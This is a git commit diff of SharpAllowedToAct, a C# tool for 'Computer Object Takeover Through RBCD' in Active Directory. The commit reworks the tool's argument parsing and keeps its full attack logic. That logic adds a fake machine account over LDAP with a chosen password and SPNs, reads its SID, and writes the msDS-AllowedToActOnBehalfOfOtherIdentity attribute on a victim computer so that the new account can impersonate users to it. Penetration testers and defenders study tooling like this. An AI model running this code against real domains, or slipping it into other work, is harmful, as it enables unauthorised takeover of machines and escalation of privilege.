6e2a5a09cf3509f0b6e24d59306ff4ea6a856620
kyleavery <9327972+kyleavery@users.noreply.github.com>
2020-10-04 10:14:03 -0500

    .

--- SharpAllowedToAct/Program.cs
+++ SharpAllowedToAct/Program.cs
@@ -2,58 +2,29 @@
 using System.Text;
 using System.Security.AccessControl;
 using System.Security.Principal;
-using CommandLine;
+using System.Collections.Generic;
 
-namespace AddMachineAccount
+namespace SharpAllowedToAct
 {
-    public class Options
-    {
-        [Option("a", "DomainController", Required = false, HelpText = "Set the domain controller to use.")]
-        public string DomainController { get; set; }
-
-        [Option("d", "Domain", Required = false, HelpText = "Set the target domain.")]
-        public string Domain { get; set; }
-
-        [Option("m", "ComputerAccountName", Required = false, HelpText = "Set the name of the new machine.")]
-        public string ComputerAccountName { get; set; }
-
-        [Option("p", "ComputerPassword", Required = false, HelpText = "Set the password for the new machine.")]
-        public string ComputerPassword { get; set; }
-
-        [Option("t", "TargetComputer", Required = true, HelpText = "Set the name of the target computer you want to exploit. Need to have write access to the computer object.")]
-        public string TargetComputer { get; set; }
-
-        [Option("c", "Cleanup", HelpText = "Empty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer")]
-        public string Cleanup { get; set; }
-
-    }
-
     class Program
     {
-
-        public static void PrintHelp()
+        public static void Usage()
         {
-            string HelpText = "\nUsage: SharpAllowedToAct.exe --ComputerAccountName FAKECOMPUTER --ComputerPassword Welcome123! --TargetComputer VICTIM\n" +
-                "\nOptions:\n" +
-                "\n-m, --ComputerAccountName\n" +
-                "\tSet the name of the new machine.\n" +
-                "\n" +
-                "-p, --ComputerPassword\n" +
-                "\tSet the password for the new machine.\n" +
-                "\n" +
-                "-t, --TargetComputer\n" +
-                "\tSet the name of the target computer you want to exploit. Need to have write access to the computer object.\n" +
-                "\n" +
-                "-a, --DomainController\n" +
-                "\tSet the domain controller to use.\n" +
-                "\n" +
-                "-d, --Domain\n" +
-                "\tSet the target domain.\n" +
-                "\n" +
-                "-c, --Cleanup\n" +
-                "\tEmpty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer.\n" +
-                "\n";
-            Console.WriteLine(HelpText);
+            Console.WriteLine("\r\nSharpAllowedToAct - Computer Object Takeover Through RBCD\r\n");
+
+            Console.WriteLine(" Arguments:");
+            Console.WriteLine(
+                "  /fakecomp - Set the name of the new machine.\r\n" +
+                "  /pass - Set the password for the new machine.\r\n" +
+                "  /computer - Set the name of the target computer you want to exploit. Need to have write access to the computer object.\r\n" +
+                "  /domain - Set the target domain.\r\n" +
+                "  /dc - Set the domain controller to use.\r\n" +
+                "  /cleanup - Empty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (true or false). Must be combined with /fakecomp. Default is false.\r\n");
+
+            Console.WriteLine(" Examples:");
+            Console.WriteLine(
+                "  SharpAllowedToAct.exe /fakecomp:FAKECOMP /pass:PASSWORD /computer:COMPUTER\r\n" +
+                "  SharpAllowedToAct.exe /fakecomp:FAKECOMP /cleanup:true");
         }
 
         public static void SetSecurityDescriptor(String Domain, String victim_distinguished_name, String victimcomputer, String sid, bool cleanup)
@@ -123,189 +94,158 @@ namespace AddMachineAccount
 
         static void Main(string[] args)
         {
-            if (args == null)
+            try
             {
-                PrintHelp();
-                return;
-            }
-
-            String DomainController = "";
-            String Domain = "";
-            String MachineAccount = "";
-            String DistinguishedName = "";
-            String password_cleartext = "";
-            String victimcomputer = "";
-
-            var Options = new Options();
-
-
-            if (CommandLineParser.Default.ParseArguments(args, Options))
-            {
-                if ((!string.IsNullOrEmpty(Options.ComputerPassword) && !string.IsNullOrEmpty(Options.TargetComputer) && !string.IsNullOrEmpty(Options.ComputerAccountName)) || (!string.IsNullOrEmpty(Options.Cleanup) && !string.IsNullOrEmpty(Options.TargetComputer)))
+                if (args.Length < 2)
                 {
-                    if (!string.IsNullOrEmpty(Options.DomainController))
+                    Usage();
+                    return;
+                }
+                Dictionary<string, string> arguments = new Dictionary<string, string>();
+                foreach (string a in args)
+                {
+                    int i = a.IndexOf(":");
+                    if (i > 0)
+                        arguments[a.Substring(1, i - 1)] = a.Substring(i + 1);
+                }
+                if ((!(arguments.ContainsKey("computer")) && !(arguments.ContainsKey("pass")) && !(arguments.ContainsKey("fakecomp"))) || (!(arguments.ContainsKey("cleanup")) && !(arguments.ContainsKey("fakecomp"))))
+                {
+                    Usage();
+                    return;
+                }
+                string orEmpty(string key) => arguments.ContainsKey(key) ? arguments[key] : "";
+
+                String TargetDC = orEmpty("dc");
+                String Domain = orEmpty("domain");
+                String OwnedComp = orEmpty("computer");
+                String PasswordClear = orEmpty("pass");
+                String Fake = orEmpty("fakecomp");
+                String Cleanup = arguments.ContainsKey("cleanup") ? arguments["cleanup"] : "false";
+
+
+                // If a domain controller and domain were not provide try to find them automatically
+                System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
+                if (TargetDC == String.Empty || Domain == String.Empty)
+                {
+                    try
                     {
-                        DomainController = Options.DomainController;
+                        current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
+                        if (TargetDC == String.Empty)
+                        {
+                            TargetDC = current_domain.PdcRoleOwner.Name;
+                        }
+
+                        if (Domain == String.Empty)
+                        {
+                            Domain = current_domain.Name;
+                        }
                     }
-                    if (!string.IsNullOrEmpty(Options.Domain))
+                    catch
                     {
-                        Domain = Options.Domain;
+                        Console.WriteLine("[!] Cannot enumerate domain, please specify with /domain and /dc flags.");
+                        return;
                     }
-                    if (!string.IsNullOrEmpty(Options.ComputerAccountName))
-                    {
-                        MachineAccount = Options.ComputerAccountName;
-                    }
-                    if (!string.IsNullOrEmpty(Options.ComputerPassword))
-                    {
-                        password_cleartext = Options.ComputerPassword;
-                    }
-                    if (!string.IsNullOrEmpty(Options.TargetComputer))
-                    {
-                        victimcomputer = Options.TargetComputer;
-                    }
+
+                }
+
+                Domain = Domain.ToLower();
+
+                String machine_account = Fake;
+                String sam_account = "";
+                if (Fake.EndsWith("$"))
+                {
+                    sam_account = machine_account;
+                    machine_account = machine_account.Substring(0, machine_account.Length - 1);
                 }
                 else
                 {
-                    Console.Write("[!] Missing required arguments! Exiting...\n");
-                    //PrintHelp();
-                    return;
+                    sam_account = machine_account + "$";
                 }
-            }
-            else
-            {
-                Console.Write("[!] Missing required arguments! Exiting...\n");
-                PrintHelp();
-                return;
-            }
 
-            String cleanup = Options.Cleanup;
 
-            // If a domain controller and domain were not provide try to find them automatically
-            System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
-            if (DomainController == String.Empty || Domain == String.Empty)
-            {
-                try
+                String distinguished_name = "";
+                String victim_distinguished_name = "";
+                String[] DC_array = null;
+
+                distinguished_name = "CN=" + machine_account + ",CN=Computers";
+                victim_distinguished_name = "CN=" + OwnedComp + ",CN=Computers";
+                DC_array = Domain.Split('.');
+
+                foreach (String DC in DC_array)
                 {
-                    current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
+                    distinguished_name += ",DC=" + DC;
+                    victim_distinguished_name += ",DC=" + DC;
                 }
-                catch
+
+                if (Cleanup != "false")
                 {
-                    Console.WriteLine("[!] Cannot enumerate domain.\n");
+                    SetSecurityDescriptor(Domain, victim_distinguished_name, OwnedComp, null, true);
                     return;
                 }
 
-            }
+                Console.WriteLine("[+] Domain = " + Domain);
+                Console.WriteLine("[+] Domain Controller = " + TargetDC);
+                Console.WriteLine("[+] New SAMAccountName = " + sam_account);
+                Console.WriteLine("[+] Distinguished Name = " + distinguished_name);
 
-            if (DomainController == String.Empty)
-            {
-                DomainController = current_domain.PdcRoleOwner.Name;
-            }
+                System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(TargetDC, 389);
+                System.DirectoryServices.Protocols.LdapConnection connection = null;
 
-            if (Domain == String.Empty)
-            {
-                Domain = current_domain.Name;
-            }
+                connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
 
-            Domain = Domain.ToLower();
+                connection.SessionOptions.Sealing = true;
+                connection.SessionOptions.Signing = true;
+                connection.Bind();
 
-            String machine_account = MachineAccount;
-            String sam_account = "";
-            if (MachineAccount.EndsWith("$"))
-            {
-                sam_account = machine_account;
-                machine_account = machine_account.Substring(0, machine_account.Length - 1);
-            }
-            else
-            {
-                sam_account = machine_account + "$";
-            }
-
-
-            String distinguished_name = DistinguishedName;
-            String victim_distinguished_name = DistinguishedName;
-            String[] DC_array = null;
-
-            distinguished_name = "CN=" + machine_account + ",CN=Computers";
-            victim_distinguished_name = "CN=" + victimcomputer + ",CN=Computers";
-            DC_array = Domain.Split('.');
-
-            foreach (String DC in DC_array)
-            {
-                distinguished_name += ",DC=" + DC;
-                victim_distinguished_name += ",DC=" + DC;
-            }
-
-            //this check is lame but cannot make the switch work with CommandLine :)
-            if (cleanup == "true")
-            {
-                SetSecurityDescriptor(Domain, victim_distinguished_name, victimcomputer, null, true);
-                return;
-            }
-
-            if (cleanup != null)
-            {
-                Console.WriteLine("Cleanup must be set to \"true\"\n. Exiting...");
-                return;
-            }
-
-            Console.WriteLine("[+] Domain = " + Domain);
-            Console.WriteLine("[+] Domain Controller = " + DomainController);
-            Console.WriteLine("[+] New SAMAccountName = " + sam_account);
-            Console.WriteLine("[+] Distinguished Name = " + distinguished_name);
-
-            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
-            System.DirectoryServices.Protocols.LdapConnection connection = null;
-
-            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
-
-            connection.SessionOptions.Sealing = true;
-            connection.SessionOptions.Signing = true;
-            connection.Bind();
-
-            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
+                var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                 new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
-                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + password_cleartext + "\"")),
+                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + PasswordClear + "\"")),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
 
             });
 
-            try
-            {
-                connection.SendRequest(request);
-                Console.WriteLine("[+] Machine account " + machine_account + " added");
-            }
-            catch (System.Exception ex)
-            {
-                Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.)");
-                Console.WriteLine("[-] Exception: " + ex.Message);
-                return;
-            }
-
-            // Get SID of the new computer object
-            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
-            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
-            SecurityIdentifier sid = null;
-
-            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
-            {
                 try
                 {
-                    sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
-                    Console.Out.WriteLine("[+] SID of New Computer: " + sid.Value);
+                    connection.SendRequest(request);
+                    Console.WriteLine("[+] Machine account " + machine_account + " added");
                 }
-                catch
+                catch (System.Exception ex)
                 {
-                    Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
+                    Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.)");
+                    Console.WriteLine("[-] Exception: " + ex.Message);
                     return;
                 }
+
+                // Get SID of the new computer object
+                var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
+                var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
+                SecurityIdentifier sid = null;
+
+                foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
+                {
+                    try
+                    {
+                        sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
+                        Console.Out.WriteLine("[+] SID of New Computer: " + sid.Value);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
+                        return;
+                    }
+                }
+
+                SetSecurityDescriptor(Domain, victim_distinguished_name, OwnedComp, sid.Value, false);
             }
 
-            SetSecurityDescriptor(Domain, victim_distinguished_name, victimcomputer, sid.Value, false);
+            catch (Exception e)
+            {
+                Console.WriteLine("{0}", e.Message);
+            }
         }
-
     }
 }
 
